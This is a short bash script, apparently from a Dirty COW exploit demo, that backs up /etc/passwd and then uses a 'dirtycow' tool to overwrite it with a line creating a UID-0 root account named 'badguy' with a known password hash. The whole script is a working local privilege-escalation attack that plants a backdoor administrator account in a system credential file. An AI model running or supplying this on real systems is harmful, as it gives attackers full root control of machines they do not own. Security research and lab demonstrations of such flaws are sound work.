#!/bin/bash
#
# Edit /etc/passwd to create a root account with credentials "badguy:badguy".

. "$(dirname "$0")/common.sh"

backup /etc/passwd "$HOME/passwd"
dirtycow -a -s "badguy:5/tk2PeameNik:0:0:root:/root:/bin/bash" /etc/passwd
